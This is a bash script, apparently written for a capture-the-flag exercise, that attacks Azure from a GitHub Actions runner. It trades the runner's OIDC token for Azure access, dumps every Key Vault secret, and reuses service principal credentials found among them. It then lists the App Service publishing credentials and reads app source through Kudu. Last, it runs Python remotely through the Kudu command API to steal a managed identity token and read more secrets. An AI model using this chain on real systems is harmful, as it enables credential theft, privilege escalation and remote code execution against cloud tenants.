#!/usr/bin/env bash
set -euo pipefail
say() { echo "$*"; }

T="${AZURE_TENANT_ID:?}"
C="${AZURE_CLIENT_ID:?}"
SUB="${AZURE_SUBSCRIPTION_ID:?}"

J=$(curl -sS --max-time 25 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
[[ -n "$J" && "$J" != "null" ]] || { say "NO_OIDC"; exit 0; }

gh_tok() {
  curl -sS --max-time 25 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
    -d "client_id=$C" \
    -d 'grant_type=client_credentials' \
    -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
    -d "client_assertion=$J" \
    -d "scope=$1" | jq -r '.access_token // empty'
}

VAULT_TOK=$(gh_tok 'https://vault.azure.net/.default')
say "VAULT_TOK_LEN=${#VAULT_TOK}"

for VAULT in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  HOST="https://${VAULT}.vault.azure.net"
  LIST=$(curl -sS --max-time 25 -H "Authorization: Bearer $VAULT_TOK" "$HOST/secrets?api-version=7.4")
  say "LIST_${VAULT}=$(echo "$LIST" | jq -c '[.value[]?.id]')"
  for name in $(echo "$LIST" | jq -r '.value[]?.id | split("/") | .[-1]'); do
    SV=$(curl -sS --max-time 25 -H "Authorization: Bearer $VAULT_TOK" "$HOST/secrets/${name}?api-version=7.4")
    VAL=$(echo "$SV" | jq -r '.value // empty')
    if [[ "$VAL" == *DF26* ]]; then say "FLAG_${VAULT}_${name}=$VAL"; fi
    if [[ "$VAL" =~ ^\{ ]]; then
      A=$(echo "$VAL" | jq -r '.appId // empty')
      P=$(echo "$VAL" | jq -r '.clientSecret // empty')
      TT=$(echo "$VAL" | jq -r '.tenantId // empty')
      [[ -n "$A" && -n "$P" ]] || continue
      SPV=$(curl -sS --max-time 25 -X POST "https://login.microsoftonline.com/$TT/oauth2/v2.0/token" \
        -d "client_id=$A" -d 'grant_type=client_credentials' -d "client_secret=$P" \
        -d 'scope=https://vault.azure.net/.default' | jq -r '.access_token // empty')
      say "SP_${name}_VAULT_LEN=${#SPV}"
      for flagname in flag FLAG df26 tebamoto-flag challenge-flag tbl-flag; do
        for V2 in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
          H2="https://${V2}.vault.azure.net"
          R=$(curl -sS --max-time 25 -H "Authorization: Bearer $SPV" "$H2/secrets/${flagname}?api-version=7.4" || true)
          F=$(echo "$R" | jq -r '.value // empty' 2>/dev/null || true)
          [[ -n "$F" ]] && say "SP_${name}_${V2}_${flagname}=$F"
        done
      done
    else
      [[ -n "$VAL" ]] && say "PLAIN_${VAULT}_${name}_LEN=${#VAL}"
    fi
  done
done

# Kudu + MSI on reporting app (storefront MSI may differ)
ARM=$(gh_tok 'https://management.azure.com/.default')
say "ARM_LEN=${#ARM}"
RPT=$(curl -sS --max-time 25 -H "Authorization: Bearer $VAULT_TOK" \
  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4")
RID=$(echo "$RPT" | jq -r '.value|fromjson|.appId // empty')
RSC=$(echo "$RPT" | jq -r '.value|fromjson|.clientSecret // empty')
RT=$(echo "$RPT" | jq -r '.value|fromjson|.tenantId // empty')
RAT=$(curl -sS --max-time 25 -X POST "https://login.microsoftonline.com/$RT/oauth2/v2.0/token" \
  -d "client_id=$RID" -d 'grant_type=client_credentials' -d "client_secret=$RSC" \
  -d 'scope=https://management.azure.com/.default' | jq -r '.access_token // empty')
B="https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
PC=$(curl -sS --max-time 25 -X POST -H "Authorization: Bearer $RAT" -H 'Content-Length: 0' \
  "$B/config/publishingcredentials/list?api-version=2023-01-01")
PU=$(echo "$PC" | jq -r '.properties.publishingUserName // empty')
PP=$(echo "$PC" | jq -r '.properties.publishingPassword // empty')
say "KUDU=$([[ -n "$PU" ]] && echo OK || echo FAIL)"
if [[ -n "$PU" && -n "$PP" ]]; then
  SCM='https://app-tbl-reporting-prod.scm.azurewebsites.net'
  V=$(curl -sS --max-time 25 -u "$PU:$PP" "$SCM/api/vfs/site/wwwroot/check_kv.py" || true)
  IE=$(printf '%s' "$V" | sed -n "s/^IE = '\([^']*\)'.*/\1/p" | head -1)
  IH=$(printf '%s' "$V" | sed -n "s/^IH = '\([^']*\)'.*/\1/p" | head -1)
  if [[ -n "$IE" && -n "$IH" ]]; then
    PY=$(cat <<PYEOF
import urllib.request,json
ie="$IE"; ih="$IH"
u=ie+"?resource=https://vault.azure.net&api-version=2019-08-01"
t=json.loads(urllib.request.urlopen(urllib.request.Request(u,headers={"X-IDENTITY-HEADER":ih}),timeout=15).read())["access_token"]
for n in ["flag","FLAG","df26","tebamoto-flag"]:
  for h in ["kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"]:
    try:
      r=urllib.request.urlopen(urllib.request.Request(f"https://{h}.vault.azure.net/secrets/{n}?api-version=7.4",headers={"Authorization":"Bearer "+t}),timeout=15)
      print("MSI",h,n,r.read().decode()[:500])
    except Exception as e:
      print("MSI_ERR",h,n,str(e)[:120])
PYEOF
)
    CMD="python3 -c $(printf '%q' "$PY")"
    OUT=$(curl -sS --max-time 90 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST \
      "$SCM/api/command" -d "$(jq -nc --arg c "$CMD" '{command:$c,dir:"/home/site/wwwroot"}')")
    say "MSI_OUT=$(echo "$OUT" | jq -r '.Output // .output // .' 2>/dev/null | tr '\n' ' ' | head -c 2000)"
  fi
fi

say DONE
